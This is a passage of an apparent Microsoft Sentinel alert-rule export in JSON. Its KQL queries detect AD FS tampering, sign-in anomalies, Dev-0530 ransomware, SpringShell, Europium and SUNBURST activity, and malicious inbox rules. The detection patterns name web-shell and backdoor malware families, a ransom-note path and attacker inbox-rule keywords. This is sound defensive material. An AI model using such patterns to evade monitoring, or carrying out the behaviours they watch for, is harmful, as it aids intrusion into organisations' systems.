claimsJson\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","DefenseEvasion"],"techniques":["T1528","T1550"],"displayName":"Microsoft Entra ID Hybrid Health AD FS Suspicious Application","enabled":true,"description":"This detection uses AzureActivity logs (Administrative category) to identify a suspicious application adding a server instance to an Microsoft Entra ID Hybrid Health AD FS service or deleting the AD FS service instance.\nUsually the Microsoft Entra ID Connect Health Agent application with ID cf6d7e68-f018-4e0a-a7b3-126e053fb88d and ID cb1056e2-e479-49de-ae31-7812af012ed8 is used to perform those operations.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1136;T1136.003","alertRuleTemplateName":"d9938c3b-16f9-444d-bc22-ea9a9110e0fd","lastModifiedUtc":"2024-10-02T22:51:27.7174379Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/9b7590fb-4286-4e5b-b43f-c0ec72d055d6","name":"9b7590fb-4286-4e5b-b43f-c0ec72d055d6","etag":"\"850097ce-0000-2700-0000-66fdab7a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let riskScoreCutoff = 20; //Adjust this based on volume of results\nlet starttime = 14d;\nlet timeframe = 1d;\nlet scorethreshold = 3;\nlet baselinethreshold = 50;\nlet aadFunc = (tableName:string){\n  // Failed Signins attempts with reasoning related to conditional access policies.\n  table(tableName)\n  | where TimeGenerated between (startofday(ago(starttime))..startofday(now()))\n  | where ResultDescription has_any (\"conditional access\", \"CA\") or ResultType in (50005, 50131, 53000, 53001, 53002, 52003, 70044)\n  | extend UserPrincipalName = tolower(UserPrincipalName)\n  | extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nlet allSignins = union isfuzzy=true aadSignin, aadNonInt;\nlet TimeSeriesAlerts = \nallSignins\n| make-series DailyCount=count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step 1d by UserPrincipalName\n| extend (anomalies, score, baseline) = series_decompose_anomalies(DailyCount, scorethreshold, -1, 'linefit')\n| mv-expand DailyCount to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\n// Filtering low count events per baselinethreshold\n| where anomalies > 0 and baseline > baselinethreshold\n| extend AnomalyHour = TimeGenerated\n| project UserPrincipalName, AnomalyHour, TimeGenerated, DailyCount, baseline, anomalies, score;\n// Filter the alerts for specified timeframe\nTimeSeriesAlerts\n| where TimeGenerated > startofday(ago(timeframe))\n| join kind=inner ( \n  allSignins\n  | where TimeGenerated > startofday(ago(timeframe))\n  // create a new column and round to hour\n  | extend DateHour = bin(TimeGenerated, 1h)\n  | summarize PartialFailedSignins = count(), LatestAnomalyTime = arg_max(TimeGenerated, *) by bin(TimeGenerated, 1h), OperationName, Category, ResultType, ResultDescription, UserPrincipalName, UserDisplayName, AppDisplayName, ClientAppUsed, IPAddress, ResourceDisplayName\n) on UserPrincipalName, $left.AnomalyHour == $right.DateHour\n| project LatestAnomalyTime, OperationName, Category, UserPrincipalName, UserDisplayName, ResultType, ResultDescription, AppDisplayName, ClientAppUsed, UserAgent, IPAddress, Location, AuthenticationRequirement, ConditionalAccessStatus, ResourceDisplayName, PartialFailedSignins, TotalFailedSignins = DailyCount, baseline, anomalies, score\n| extend timestamp = LatestAnomalyTime, Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n| extend UserPrincipalName = tolower(UserPrincipalName)\n| join kind=leftouter (\n    IdentityInfo\n    | summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\n    | project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled\n    | summarize\n        Tags = make_set(Tags, 1000),\n        GroupMembership = make_set(GroupMembership, 1000),\n        AssignedRoles = make_set(AssignedRoles, 1000),\n        UserType = make_set(UserType, 1000),\n        UserAccountControl = make_set(UserType, 1000)\n    by AccountUPN\n    | extend UserPrincipalName=tolower(AccountUPN)\n) on UserPrincipalName\n| join kind=leftouter (\n    BehaviorAnalytics\n    | where ActivityType in (\"FailedLogOn\", \"LogOn\")\n    | where isnotempty(SourceIPAddress)\n    | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress\n    | project-rename IPAddress = SourceIPAddress\n    | summarize\n        UsersInsights = make_set(UsersInsights, 1000),\n        DevicesInsights = make_set(DevicesInsights, 1000),\n        IPInvestigationPriority = sum(InvestigationPriority)\n    by IPAddress)\non IPAddress\n| extend UEBARiskScore = IPInvestigationPriority\n| where UEBARiskScore > riskScoreCutoff\n| sort by UEBARiskScore desc \n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"2.0.5","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"User Accounts - Sign in Failure due to CA Spikes","enabled":true,"description":"Identifies spike in failed sign-ins from user accounts due to conditional access policied.\nSpike is determined based on Time series anomaly which will look at historical baseline values.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\nThis query has also been updated to include UEBA logs IdentityInfo and BehaviorAnalytics for contextual information around the results.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0003;T1078;T1078.004,TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004,TA0007;T1087;T1087.004","alertRuleTemplateName":"3a9d5ede-2b9d-43a2-acc4-d272321ff77c","lastModifiedUtc":"2024-10-02T20:22:04.8888142Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7fead111-942e-4665-a8cf-ecc1101c0d1d","name":"7fead111-942e-4665-a8cf-ecc1101c0d1d","etag":"\"53015d58-0000-2700-0000-65aacd420000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"    DeviceFileEvents\n    | where ActionType == \"FileCreated\"\n    | where FileName endswith \".h0lyenc\" or FolderPath == \"C:\\\\FOR_DECRYPT.html\"\n    | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated)\n        by\n        AccountCustomEntity = iff(isnotempty(InitiatingProcessAccountUpn), InitiatingProcessAccountUpn, InitiatingProcessAccountName),\n        HostCustomEntity = DeviceName,\n        Type,\n        InitiatingProcessId,\n        FileName,\n        FolderPath,\n        EventType = ActionType,\n        Commandline = InitiatingProcessCommandLine,\n        InitiatingProcessFileName,\n        InitiatingProcessSHA256,\n        FileHashCustomEntity = SHA256,\n        AlgorithmCustomEntity = \"SHA256\"\n   ","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"AlgorithmCustomEntity"},{"identifier":"Value","columnName":"FileHashCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1486"],"displayName":"Dev-0530 File Extension Rename","enabled":true,"description":"Dev-0530 actors are known to encrypt the contents of the victims device as well as renaming the file extensions. This query looks for the creation of files with .h0lyenc extension or presence of ransom note.","alertRuleTemplateName":"d82eb796-d1eb-43c8-a813-325ce3417cef","lastModifiedUtc":"2024-01-19T19:27:59.8629453Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/622543d9-b8f9-46e1-8024-221742e2ae5f","name":"622543d9-b8f9-46e1-8024-221742e2ae5f","etag":"\"8800b829-0000-2700-0000-66fdcf780000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let admin_users = (IdentityInfo\n  | summarize arg_max(TimeGenerated, *) by AccountUPN\n  | where AssignedRoles contains \"admin\"\n  | summarize by tolower(AccountUPN));\n  let admin_asn = (SigninLogs\n  | where TimeGenerated between (ago(7d)..ago(1d))\n  | where tolower(UserPrincipalName) in (admin_users)\n  | summarize by AutonomousSystemNumber);\n  let admin_locations = (SigninLogs\n  | where TimeGenerated between (ago(7d)..ago(1d))\n  | where tolower(UserPrincipalName) in (admin_users)\n  | summarize by Location);\n  let admin_devices = (SigninLogs\n  | where TimeGenerated between (ago(7d)..ago(1d))\n  | where tolower(UserPrincipalName) in (admin_users)\n  | extend deviceId = tostring(DeviceDetail.deviceId)\n  | where isnotempty(deviceId)\n  | summarize by deviceId);\n  SigninLogs\n  | where TimeGenerated > ago(1d)\n  | where ResultType == 0\n  | where tolower(UserPrincipalName) in (admin_users)\n  | extend deviceId = tostring(DeviceDetail.deviceId)\n  | where AutonomousSystemNumber !in (admin_asn) and deviceId !in (admin_devices) and Location !in (admin_locations)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Authentications of Privileged Accounts Outside of Expected Controls","enabled":true,"description":"Detects when a privileged user account successfully authenticates from a location, device or ASN that another admin has not logged in from in the last 7 days.\n  Privileged accounts are a key target for threat actors, monitoring for logins from these accounts that deviate from normal activity can help identify compromised accounts.\n  Authentication attempts should be investigated to ensure the activity was legitimate and if there is other similar activity.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-successful-unusual-sign-ins\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0003;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0004;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0005;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":"af435ca1-fb70-4de1-92c1-7435c48482a9","lastModifiedUtc":"2024-10-02T22:55:48.4793136Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c2d2711a-3c1c-4da8-9ddb-f1910b298f9e","name":"c2d2711a-3c1c-4da8-9ddb-f1910b298f9e","etag":"\"88006724-0000-2700-0000-66fdcf1a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let SpringShell_threats = dynamic([\"Trojan:Python/SpringShellExpl\", \"Exploit:Python/SpringShell\", \"Backdoor:PHP/Remoteshell.V\", \"SpringShell\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=inner ( SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (SpringShell_threats) or ThreatFamilyName in~ (SpringShell_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities\n| extend HostName = tostring(split(CompromisedEntity, \".\")[0]), DomainIndex = toint(indexof(CompromisedEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(CompromisedEntity, DomainIndex + 1), CompromisedEntity)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"CompromisedEntity"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"PublicIP"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1190"],"displayName":"AV detections related to SpringShell Vulnerability","enabled":true,"description":"This query looks for Microsoft Defender AV detections related to the SpringShell vulnerability. In Microsoft Sentinel, the SecurityAlerts table includes only the Device Name of the affected device.\n  This query joins the DeviceInfo table to clearly connect other information such as device group, IP, logged-on users, etc. This would allow the Microsoft Sentinel analyst to have more context related to the alert, if available.\n  Reference: https://www.microsoft.com/security/blog/2022/04/04/springshell-rce-vulnerability-guidance-for-protecting-against-and-detecting-cve-2022-22965/\nPLATFORM:IaaS,Windows\nMITRE:TA0001;T1190","alertRuleTemplateName":"3bd33158-3f0b-47e3-a50f-7c20a1b88038","lastModifiedUtc":"2024-10-02T22:54:17.863698Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4aaf9ede-eefa-4613-ad4f-b2c15c9afe55","name":"4aaf9ede-eefa-4613-ad4f-b2c15c9afe55","etag":"\"ed0012ec-0000-2700-0000-65f082a40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1d;\nlet TotalEventsThreshold = 25;\nlet TimeSeriesData = AzureActivity \n| where TimeGenerated between (startofday(ago(starttime))..startofday(now())) \n| where OperationNameValue endswith \"delete\" \n| project TimeGenerated, Caller \n| make-series Total = count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step timeframe by Caller;\nTimeSeriesData \n| extend (anomalies, score, baseline) = series_decompose_anomalies(Total, 3, -1, 'linefit') \n| mv-expand Total to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long) \n| where TimeGenerated >= startofday(ago(endtime)) \n| where anomalies > 0 \n| project Caller, TimeGenerated, Total, baseline, anomalies, score \n| where Total > TotalEventsThreshold and baseline > 0 \n| join (AzureActivity \n| where TimeGenerated > startofday(ago(endtime)) \n| where OperationNameValue endswith \"delete\" \n| summarize count(), make_set(OperationNameValue,100), make_set(_ResourceId,100) by bin(TimeGenerated, timeframe), Caller ) on TimeGenerated, Caller \n| extend Name = iif(Caller has '@',tostring(split(Caller,'@',0)[0]),\"\")\n| extend UPNSuffix = iif(Caller has '@',tostring(split(Caller,'@',1)[0]),\"\")\n| extend AadUserId = iif(Caller !has '@',Caller,\"\")\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"AadUserId"}]}],"templateVersion":"2.0.4","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1485"],"displayName":"Mass Cloud resource deletions Time Series Anomaly","enabled":true,"description":"This query generates the baseline pattern of cloud resource deletions by an individual and generates an anomaly when any unusual spike is detected. These anomalies from unusual or privileged users could be an indication of a cloud infrastructure takedown by an adversary.","alertRuleTemplateName":"ed43bdb7-eaab-4ea4-be52-6951fcfa7e3b","lastModifiedUtc":"2024-03-12T16:28:18.9554916Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a6cc91cc-427c-4cea-8bb6-8448fd4e5e81","name":"a6cc91cc-427c-4cea-8bb6-8448fd4e5e81","etag":"\"87005709-0000-2700-0000-66fdbc740000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"NRT","properties":{"severity":"Medium","query":"let Keywords = dynamic([\"helpdesk\", \" alert\", \" suspicious\", \"fake\", \"malicious\", \"phishing\", \"spam\", \"do not click\", \"do not open\", \"hijacked\", \"Fatal\"]);\nOfficeActivity\n| where OfficeWorkload =~ \"Exchange\"\n| where Parameters has \"Deleted Items\" or Parameters has \"Junk Email\"  or Parameters has \"DeleteMessage\"\n| extend Events=todynamic(Parameters)\n| parse Events  with * \"SubjectContainsWords\" SubjectContainsWords '}'*\n| parse Events  with * \"BodyContainsWords\" BodyContainsWords '}'*\n| parse Events  with * \"SubjectOrBodyContainsWords\" SubjectOrBodyContainsWords '}'*\n| where SubjectContainsWords has_any (Keywords)\n or BodyContainsWords has_any (Keywords)\n or SubjectOrBodyContainsWords has_any (Keywords)\n| extend ClientIPAddress = case( ClientIP has \".\", tostring(split(ClientIP,\":\")[0]), ClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))), ClientIP )\n| extend Keyword = iff(isnotempty(SubjectContainsWords), SubjectContainsWords, (iff(isnotempty(BodyContainsWords),BodyContainsWords,SubjectOrBodyContainsWords )))\n| extend RuleDetail = case(OfficeObjectId contains '/' , tostring(split(OfficeObjectId, '/')[-1]) , tostring(split(OfficeObjectId, '\\\\')[-1]))\n| summarize count(), StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by  UserId, ClientIPAddress, ResultStatus, Keyword, OriginatingServer, OfficeObjectId, RuleDetail","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"OriginatingServer"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIPAddress"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","DefenseEvasion"],"techniques":["T1098","T1078"],"displayName":"NRT Malicious Inbox Rule","enabled":true,"description":"Often times after the initial compromise the attackers create inbox rules to delete emails that contain certain keywords.\n This is done so as to limit ability to warn compromised users that they've been compromised. Below is a sample query that tries to detect this.\nReference: https://www.reddit.com/r/sysadmin/comments/7kyp0a/recent_phishing_attempts_my_experience_and_what/\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0003;T1098;T1098.002,TA0005;T1562;T1562.008","alertRuleTemplateName":"b79f6190-d104-4691-b7db-823e05980895","lastModifiedUtc":"2024-10-02T21:34:43.6164157Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1967820d-91d1-4a7b-ac69-d1c3cf5003df","name":"1967820d-91d1-4a7b-ac69-d1c3cf5003df","etag":"\"0600449c-0000-2700-0000-64aef5a10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let excludeProcs = dynamic([@\"\\SolarWinds\\Orion\\APM\\APMServiceControl.exe\", @\"\\SolarWinds\\Orion\\ExportToPDFCmd.Exe\", @\"\\SolarWinds.Credentials\\SolarWinds.Credentials.Orion.WebApi.exe\", @\"\\SolarWinds\\Orion\\Topology\\SolarWinds.Orion.Topology.Calculator.exe\", @\"\\SolarWinds\\Orion\\Database-Maint.exe\", @\"\\SolarWinds.Orion.ApiPoller.Service\\SolarWinds.Orion.ApiPoller.Service.exe\", @\"\\Windows\\SysWOW64\\WerFault.exe\", @\"(x86)\\SolarWinds\\Orion\\SolarWinds.Topology.Calculator.exe\"]);\nDeviceProcessEvents\n| where InitiatingProcessFileName =~ \"solarwinds.businesslayerhost.exe\"\n| where not(FolderPath has_any (excludeProcs))\n| extend\n    timestamp = TimeGenerated,\n    AccountCustomEntity = iff(isnotempty(InitiatingProcessAccountUpn), InitiatingProcessAccountUpn, InitiatingProcessAccountName),\n    HostCustomEntity = DeviceName,\n    AlgorithmCustomEntity = \"MD5\",\n    FileHashCustomEntity = MD5","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"AlgorithmCustomEntity"},{"identifier":"Value","columnName":"FileHashCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","Persistence"],"techniques":[],"displayName":"SUNBURST suspicious SolarWinds child processes","enabled":true,"description":"Identifies suspicious child processes of SolarWinds.Orion.Core.BusinessLayer.dll that may be evidence of the SUNBURST backdoor\nReferences:\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://gist.github.com/olafhartong/71ffdd4cab4b6acd5cbcd1a0691ff82f","alertRuleTemplateName":"4a3073ac-7383-48a9-90a8-eb6716183a54","lastModifiedUtc":"2023-07-12T18:49:04.7154152Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8443198f-0e49-4b81-ac85-d83142ee5468","name":"8443198f-0e49-4b81-ac85-d83142ee5468","etag":"\"8800cc26-0000-2700-0000-66fdcf410000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let Europium_threats = dynamic([\"TrojanDropper:ASP/WebShell!MSR\", \"Trojan:Win32/BatRunGoXml\", \"DoS:Win64/WprJooblash\", \"Ransom:Win32/Eagle!MSR\", \"Trojan:Win32/Debitom.A\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=inner ( SecurityAlert\n| where ProviderName == \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (Europium_threats) or ThreatFamilyName in~ (Europium_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"CompromisedEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"PublicIP"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","PrivilegeEscalation","Execution","DefenseEvasion","CredentialAccess","Discovery","LateralMovement","Collection","CommandAndControl","Exfiltration"],"techniques":["T1078","T1566","T1133","T0865","T1137","T1053","T1505","T0859","T1059","T1204","T0853","T1140","T1070","T1036","T1027","T1218","T1497","T1110","T1555","T1056","T1003","T1552","T1087","T1046","T1120","T1201","T1069","T1057","T1012","T1082","T1016","T1049","T1033","T1007","T1021","T1119","T1113","T1071","T1573","T1008","T1105","T1572","T0869","T1048"],"displayName":"AV detections related to Europium actors","enabled":true,"description":"This query looks for Microsoft Defender AV detections related to Europium actor. In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device,\nthis query joins the DeviceInfo table to clearly connect other information such as Device group, ip, etc. This would allow the Microsoft Sentinel analyst to have more context related to the alert, if available.                                                                                                                               \nEUROPIUM is now tracked as Hazel Sandstorm alias OilRig/ Apt34\nReference: https://www.microsoft.com/security/blog/2022/09/08/microsoft-investigates-iranian-attacks-against-the-albanian-government                                                                                                                                                                                                                                      https://attack.mitre.org/groups/G0049/\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078,TA0003;T1078,TA0004;T1078,TA0005;T1078,TA0006;T1110;T1110.001;T1110.003;T1110.004;T1552;T1552.001;T1552.005,TA0007;T1069;T1069.003;T1082;T1087;T1087.004;T1201,TA0008;T1021;T1021.001,TA0009;T1119,TA0010;T1048","alertRuleTemplateName":"186970ee-5001-41c1-8c73-3178f75ce96a","lastModifiedUtc":"2024-10-02T22:54:54.4573696Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/72d5b0eb-50c8-41a5-9c18-2f76b64bd282","name":"72d5b0eb-50c8-41a5-9c18-2f76b64bd282","etag":"\"70093d0f-0000-2700-0000-6699770c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P2D","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// In User & Groups and in Applications, the following \"AccessType\" values in columns PremodifiedOutboundSettings and ModifiedOutboundSettings are interpreted accordingly\n// When Access Type in premodified outbound settings value was 1 that means that the initial access was allowed. When Access Type in premodified outbound settings value was 2 that means that the initial access was blocked.\n// When Access Type in modified outbound settings value is 1 that means that now access is allowed. When Access Type in modified outbound settings value is 2 that means that now access is blocked.\nAuditLogs\n| where OperationName has \"Update a partner cross-tenant access setting\"\n| mv-apply TargetResource = TargetResources on\n  (\n      where TargetResource.type =~ \"Policy\"\n      | extend Properties = TargetResource.modifiedProperties\n  )\n| mv-apply Property = Properties on\n  (\n      where Property.displayName =~ \"b2bCollaborationOutbound\"\n      | extend 